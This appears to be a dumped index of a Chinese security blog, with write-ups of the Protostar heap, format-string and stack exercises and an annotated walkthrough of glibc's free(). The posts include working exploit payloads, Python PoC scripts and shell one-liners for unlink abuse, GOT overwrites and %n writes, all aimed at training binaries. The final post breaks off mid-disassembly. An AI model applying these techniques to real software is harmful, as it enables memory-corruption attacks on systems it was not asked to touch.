x+071k1fI0ayFAHAEm1UPkg5rTJ+sXIwWfrPhG18FgBbohSLSqsCEifWvL5ydVYcZy5ojwxd4szpZbskSvd+OZbCxG5xeobA==","tags":[]},{"title":"Protostar-堆溢出学习-滥用堆metadata重定向程序执行","date":"2017-04-26T13:24:19.000Z","path":"2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/","text":"0x00 序 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对linux堆管理DLMalloc的分析这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; void winner() { printf(&quot;that wasn&#39;t too bad now, was it? @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(&quot;dynamite failed?\\n&quot;); } 0x02 简单分析&amp;思考在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到winner()函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知free()函数中的unlink()函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行winner()函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。就照着这个思路来一步步实现这个过程。 0x03 调试1.输入AAAA BBBB CCCC然后free前后后观察堆结构由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。因为chunk的大小2–&gt;3–&gt;null`的方式连接 2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。因为我们准备向前合并，所以将preinuse位设为1，即64+1=65 3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。构造字符串：CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\\xfc\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08 4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。这里我们用在线的转换工具下面的汇编转化为x86指令字符串 mov eax,0x8048864 call eax 0x8048864为winner()函数地址 5.将上面的shellcode写入第一个chunk那里，here we hack！下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。GoT地址已经修改，下面可以看到已经执行了winnwe()函数 0x04 一点补充在上面构造chunk中，也许你已经发现了chunk大小为0xfffffffc，这是一个什么巧妙的方法去绕过free()里面的检查等。具体的细节可以看Once upon a free()这篇文章，简单的说就是当某个数加上0xfffffffc时会造成溢出相当于减4从而使其向前偏移4个字节，绕过检查，避免崩溃。 0x05 堆漏洞学习总结目前可能这是最后一个堆漏洞的学习，这个堆漏洞的学习理解到动手前后花费了大量时间，不过这都是值得的，如果能够坚持下来，将会对堆漏洞有一个清晰的认识。以后再遇到漏洞或者别人的分析能够快速准确的理解。虽然现在堆管理代码经过了很多改善和patch，但基本和关键的技术还是没变。所以keep hacking!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"metadata","slug":"metadata","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/metadata/"},{"name":"DLMalloc","slug":"DLMalloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/DLMalloc/"}]},{"title":"深入理解Linux堆分配器-DLMalloc","date":"2017-04-23T04:16:00.000Z","path":"2017/04/23/Linux堆分配器-DLMalloc/Linux堆分配器-DLMalloc/","text":"0x00 序 当学习漏洞利用到一定阶段的时候，就需要对操作系统层面有足够的认识。无疑Linux的堆管理一直是不能甚解。因此这篇文章将对Linux的DLMalloc进行详细的介绍，以此对操作系统的堆管理有一个清晰整体的认识，当我在学习的过程中，好像没有发现一篇中文文章来详细介绍相关内容，所以本文仅仅是我通过学习和实践得到的理解，若有不对，请指出。 0x01 目录1.DLMalloc2.内存Chunk3.Bin4.malloc源码free()函数分析 0x02 DLMallocDoug Lea’s Malloc (dlmalloc)是一个GNU C库的内存分配器，它能够通过calloc(),malloc(), free()和realloc()等动态分配和释放的函数来管理内存。明显内存分配器在操作系统中是相当重要的，主要在需要满足下列的特点： 稳定性(stability) 性能(performance) 避免碎片化(avoidance of fragmentation) 低空间开销(low space overhead）根据上面的内存特点，将有助于后面对chunk以及Bin等的理解。 0x03 内存chunk1.什么是chunk？chunk是堆中一些连续的内存块，可以用作分配，释放，拆分，合并。不存在两个连续的释放chunk，这是在于相邻的chunk会合并。 2.数据结构 struct malloc_chunk { INTERNAL_SIZE_T prev_size; //当前chunk前一个chunk的大小，仅在前一个为freed才使用 INTERNAL_SIZE_T size; //当前chunk的大小 struct malloc_chunk * fd; //如果当前为释放chunk，指向双向free list中前一个chunk struct malloc_chunk * bk; //如果当前为释放chunk，指向双向free list中后一个chunk } 根据上面的描述我们可以知道，chunk在分配时和释放时数据结构是不同的，看下面的图例: allocate chunk freed chunk 3.更多细节因为chunk是按照8字节对齐的，所以当前块中的size低三位将用作相关标志，从右到左A M P分别代表：是否在主heap？是否通过mmap()分配？前一个chunk是否在使用？然后可以想到有一个最小chunk的存在，其大小为16字节()。 4.特殊chunktop chunk:指可能内存边界的末端，也被称作wilderness chunk。如果其他bin都不满足malloc的情况下，就会从top chunk里去一部分去满足分配请求，剩余的则作为新的top chunk，并且top chunk不在任何一个bin中。随着被分离和合并top chunk会增大和减小。 last_remainder:和top chunk一样，不在任何一个bin中，但最终可能会合并到一个bin中。可以看英文原文解释：The last_remainder chunk is the result of allocation requests for small chunks that have no exact fit in any of the bins. If the request is larger than the last_remainder chunk but smaller than a block in a bin, then the chunk is split again. The last_remainder chunk is the result of having to split a larger chunk into two, one part of it is handed out from the allocation, and the other because the last_remainder chunk. 0x04 Binchunk一旦被释放后就会被存储在叫做Bin的链表中，Bin有不同大小的链表，方便与下次查找到最适当的chunk。通常来说有small-bin，large-bin，fast-bin。这里我主要介绍fsatbin和normalbin (1)fastbin：是一种单链表bin，不同系统定义了一个最大值，当chunk大小小于等于这个最大值时，就会被释放到fastbin中，正如名字那样，为了更快的free和malloc，这个链表是无序的，是后进先出（LIFO），并且不与其他chunk合并。(2)normalbin:是一种双向链表bin，当chunk大小大于fastbin的大小时就会被放入这个bin，并且有着各种大小的normalbin(减少碎片)，bin内部的chunk按大小组织起来。释放后会于相邻的chunk合并。 0x05 free()源代码分析及相关细节free(void *mem)--&gt;__libc_free(void *mem) void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); //跳转到_int_free } 我们先不关注其他的，只需要知道会调用_int_free就就可以了 __libc_free(void *mem)--&gt;_int_free (mstate av, mchunkptr p, int have_lock) static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* 当前chunk的大小 */ mfastbinptr *fb; /* 相关的fastbin */ mchunkptr nextchunk; /* 下一个相邻的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk的大小 */ int nextinuse; /* 下一个chunk正在使用时为真 */ INTERNAL_SIZE_T prevsize; /* 前一个chunk的大小 */ mchunkptr bck; /* 指向free链表中向后一个chunk */ mchunkptr fwd; /* 指向free链表中向前一个chunk */ const char *errstr = NULL; int locked = 0; size = chunksize (p); /* Little security check which won&#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by &quot;design&quot; from some intruder. */ //一些安全检查 if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = &quot;free(): invalid pointer&quot;; errout: if (!have_lock &amp;&amp; locked) __libc_lock_unlock (av-&gt;mutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ //检查是否满足大于等于最小大小 if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) { errstr = &quot;free(): invalid size&quot;; goto errout; } check_inuse_chunk(av, p); //检查当前chunk是否在使用 /* 如果满足，则将该chunk放入fastbin以便malloc时能够快速找到和使用 */ if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don&#39;t place chunks bordering top into fastbins */ &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); __libc_lock_lock (av-&gt;mutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; })) { errstr = &quot;free(): invalid next size (fast)&quot;; goto errout; } if (! have_lock) { __libc_lock_unlock (av-&gt;mutex); locked = 0; } } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &amp;fastbin (av, idx); /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = &quot;double free or corruption (fasttop)&quot;; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock &amp;&amp; old != NULL) old_idx = fastbin_index(chunksize(old)); p-&gt;fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) { errstr = &quot;invalid fastbin entry (free)&quot;; goto errout; } } /* Consolidate other non-mmapped chunks as they arrive. */ //检查是否是通过mmap()分配的内存 else if (!chunk_is_mmapped(p)) { if (! have_lock) { __libc_lock_lock (av-&gt;mutex); locked = 1; } nextchunk = chunk_at_offset(p, size);//返回下一个chunk的地址 /* Lightweight tests: check whether the block is already the top block. */ //检查下一个是否为top-chunk if (__glibc_unlikely (p == av-&gt;top)) { errstr = &quot;double free or corruption (top)&quot;; goto errout; } /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) { errstr = &quot;double free or corruption (out)&quot;; goto errout; } /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) { errstr = &quot;double free or corruption (!prev)&quot;; goto errout; } nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) { errstr = &quot;free(): invalid next size (normal)&quot;; goto errout; } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); /* 与后面chunk一个合并 */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);//将后一个chunk从双向链表上取下来 } if (nextchunk != av-&gt;top) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); /* 与前面chunk一个合并*/ if (!nextinuse) { unlink(av, nextchunk, bck, fwd);//将前一个chunk从双向链表上取下来 size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;free(): corrupted unsorted chunks&quot;; goto errout; } p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) { p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; } bck-&gt;fd = p; fwd-&gt;bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); } /* 如果当前chunk正好与topchunk相邻，则合并到topchunk */ else { size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); } /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don&#39;t know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don&#39;t want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) { if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) { #ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (! have_lock) { assert (locked); __libc_lock_unlock (av-&gt;mutex); } } /* If the chunk was allocated via mmap, release via munmap(). */ else { munmap_chunk (p); } } 这里看看unlink()宏定义 #define unlink( P, BK, FD ) { BK = P-&gt;bk; FD = P-&gt;fd; FD-&gt;bk = BK; //可能会造成任意写 BK-&gt;fd = FD; } 现在我们重点放在unlink()，当两个相邻chunk需要合并的时候，势必需要将临近的chunk从原来的双链表上取下来，然后与当前chunk合并成一个更大的块。等等！怎么取下来的呢？如果这里存在一个恶意的chunk即fd和bk都是一些恶意地址指针，则会出现任意地址写的一个漏洞。在这里我们就先不去讨论进一步的利用过程，只需知道存在一个这样的漏洞即可，后面会根据这个分析去漏洞利用。 glibc/malloc.c源码 0x06 参考 Vudo malloc tricks A Memory Allocator Once upon a free()","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"heap","slug":"heap","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"},{"name":"malloc","slug":"malloc","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/malloc/"},{"name":"free","slug":"free","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/free/"}]},{"title":"Protostar-堆溢出学习-UAF(use after free)","date":"2017-04-21T03:12:19.000Z","path":"2017/04/21/Protostar-堆溢出系列学习-heap 2/Protostar-堆溢出系列学习-heap 2/","text":"0x00 序 下面看一个堆中常见的漏洞-UAF(use after free) 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdio.h&gt; struct auth { char name[32]; int auth; }; struct auth *auth; char *service; int main(int argc, char **argv) { char line[128]; while(1) { printf(&quot;[ auth = %p, service = %p ]\\n&quot;, auth, service); if(fgets(line, sizeof(line), stdin) == NULL) break; if(strncmp(line, &quot;auth &quot;, 5) == 0) { auth = malloc(sizeof(auth)); memset(auth, 0, sizeof(auth)); if(strlen(line + 5) &lt; 31) { strcpy(auth-&gt;name, line + 5); } } if(strncmp(line, &quot;reset&quot;, 5) == 0) { free(auth); } if(strncmp(line, &quot;service&quot;, 6) == 0) { service = strdup(line + 7); } if(strncmp(line, &quot;login&quot;, 5) == 0) { if(auth-&gt;auth) { printf(&quot;you have logged in already!\\n&quot;); } else { printf(&quot;please enter your password\\n&quot;); } } } } 0x02 分析&amp;思考程序有4个命令，对auth这个结构体进行分配内存以及释放内存，然后有结构体里的auth-&gt;auth来决定是否授权。很明显让我们修改auth-&gt;auth的值。reset命令释放auth但没有设为null，后面auth-&gt;auth发生引用。所以这里有个UAF漏洞。 0x03 调试&amp;hack1.在第一个printf处下个断点，观察每次分配和释放后堆，auth以及service的情况 2.先输入auth admin，然后输入login试试3.再输入reset释放堆内存4.输入service分配内存5.以上我们可以发现，给service分配的内存居然也指向auth的地址？因为之前free了auth，所以系统认为这段内存为可用，当再次分配的时候就会返回对应内存。基于此，我们继续给service分配内存，让其覆盖auth-&gt;auth的内存值。6.再次输入login命令 0x04 一点感受通过这个例子简单的学习了UAF漏洞后，无疑free后不设为null，后果是不敢想象的。继续学习堆相关的漏洞利用。keep hack！","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"UAF","slug":"UAF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/UAF/"}]},{"title":"Protostar-堆溢出学习-strcpy堆指针造成任意地址GOT表写","date":"2017-04-19T03:12:19.000Z","path":"2017/04/19/Protostar-堆溢出系列学习-heap 1/Protostar-堆溢出系列学习-heap 1/","text":"0x00 序 现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct internet { int priority; char *name; }; void winner() { printf(&quot;and we have a winner @ %d\\n&quot;, time(NULL)); } int main(int argc, char **argv) { struct internet *i1, *i2, *i3; i1 = malloc(sizeof(struct internet)); i1-&gt;priority = 1; i1-&gt;name = malloc(8); i2 = malloc(sizeof(struct internet)); i2-&gt;priority = 2; i2-&gt;name = malloc(8); strcpy(i1-&gt;name, argv[1]); strcpy(i2-&gt;name, argv[2]); printf(&quot;and that&#39;s a wrap folks!\\n&quot;); } 0x02 简单的分析&amp;思考如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个strcpy，肯定是要去覆盖和修改某个地方的地址。其实strcpy这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。在这个列子中，我们就借此去修改printf函数的GOT表。 0x03 调试1.查看堆分配情况2.查看汇编代码，找到执行入口3.首先利用第一个strcpy将i2的name指针改为GOT表地址，然后利用第二个strcpy向这个地址写入winner的地址，由此编写对应的Python PoC import struct padding = &quot;AAAA&quot;*5 put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址 space = &quot; &quot; winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址 print padding+put_got+space+winner 4.hack user@protostar:/tmp$ /opt/protostar/bin/heap1 `python heap1.py` and we have a winner @ 1492452139 成功执行winner函数 0x04 一点感受学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将strcpy改为strncpy或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"},{"name":"strcpy","slug":"strcpy","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/strcpy/"},{"name":"GOT表","slug":"GOT表","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/GOT表/"}]},{"title":"Protostar-堆溢出学习-覆盖堆函数指针劫持代码流","date":"2017-04-18T03:12:19.000Z","path":"2017/04/18/Protostar-堆溢出系列学习-heap 0/Protostar-堆溢出系列学习-heap 0/","text":"0x00 序 学习了栈溢出相关的漏洞利用技巧，下面进入堆溢出相关。和栈溢出一样，从最简单的堆溢出开始，看看是如何利用堆溢出去控制程序的执行流程的。 0x01 C语言源代码C代码 #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&quot;level passed\\n&quot;); } void nowinner() { printf(&quot;level has not been passed\\n&quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&gt;fp = nowinner; printf(&quot;data is at %p, fp is at %p\\n&quot;, d, f); strcpy(d-&gt;name, argv[1]); f-&gt;fp(); } 0x02 简单分析&amp;思考先在堆上分配了一个data和fp的结构体，然后使fp指向nowinner函数，然后打印对应分配的堆地址，以及将argv[1]复制到data结构体，最后调用nowinner函数。 可以知道我们需要去执行winner函数，怎么做到呢？ 由于strcpy没对数据长度进行检查，那我们是否可以利用堆溢出将fp结构体里面的函数指针改为winner函数？Here we go！ 0x03 malloc()在继续分析之前，我们先来简单的介绍一下malloc函数，在这里malloc函数更多是对mmap系统调用函数的一个封装，为什么要封装呢？也就是为什么不直接调用mmap来进行堆分配，原因是为了方便堆的管理，简单的理解可以把堆看做一个很大的内存块。 那是如何管理堆的呢？见下 堆标志 分配大小 malloc返回地址addr 00000000 00000011 00000000 00000000 00000000 00000031 AAAAAAAA BBBBBBBB CCCCCCCC DDDDDDDD EEEEEEEE FFFFFFFF … … … … 00000000 00000011 00000000 00000000 每次分配的时候会额外分配16字节的管理开销，来表示所分配堆的信息。比如可以通过addr-4拿到自身的分配大小从而决定下次分配的选择 注：分配大小的第一位表示前面的内存块是否在使用 0x04 调试&amp;hack通过前面的分析，我们的目的很明确，需要通过strcpy(d-&gt;name, argv[1]);去重写fp结构体里面的函数指针，使其为winner函数的地址。 1.利用gdb查看strcpy前后堆的情况我们看到AAAABBBBCCC…分配到了data堆上，如果我们输入更长的数据，就可以将fp的nowinner地址改为winner地址 2.查看winner地址，重写fp函数指针 (gdb) p winner $1 = {void (void)} 0x8048464 &lt;winner&gt; 3.PoC Python脚本 import struct padding = &quot;A&quot;*64 #填充data head = &quot;BBBB&quot; # not care head += &quot;CCCC&quot; # not care winner = struct.pack(&quot;I&quot;, 0x8048464) #将nowinner地址改为winner地址 print padding+head+winner 4.hack成功执行winner函数!","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/堆溢出/"}]},{"title":"Protostar-栈溢出学习-printf格式%n任意地址写","date":"2017-04-17T03:12:19.000Z","path":"2017/04/17/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序 从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln(char *string) { printf(string); if(target) { printf(&quot;you have modified the target :)\\n&quot;); } } int main(int argc, char **argv) { vuln(argv[1]); } 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 ... local variables of main saved registers of main return address of main argc argv envp stack from startup code argc argv pointers NULL that ends argv[] environment pointers NULL that ends envp[] ELF Auxiliary Table argv strings &lt;--------focus here environment strings program name NULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试 /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot; 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n /opt/protostar/bin/format1 &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\\x38\\x96\\x04\\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot; run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出学习-ROP执行shellcode","date":"2017-04-16T03:12:19.000Z","path":"2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); } printf(&quot;got path %s\\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编Dump of assembler code for function getpath: 0x08048484 &lt;getpath+0&gt;: push ebp 0x08048485 &lt;getpath+1&gt;: mov ebp,esp 0x08048487 &lt;getpath+3&gt;: sub esp,0x68 0x0804848a &lt;getpath+6&gt;: mov eax,0x80485d0 0x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax 0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt; 0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x8049720 0x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax 0x0804849f 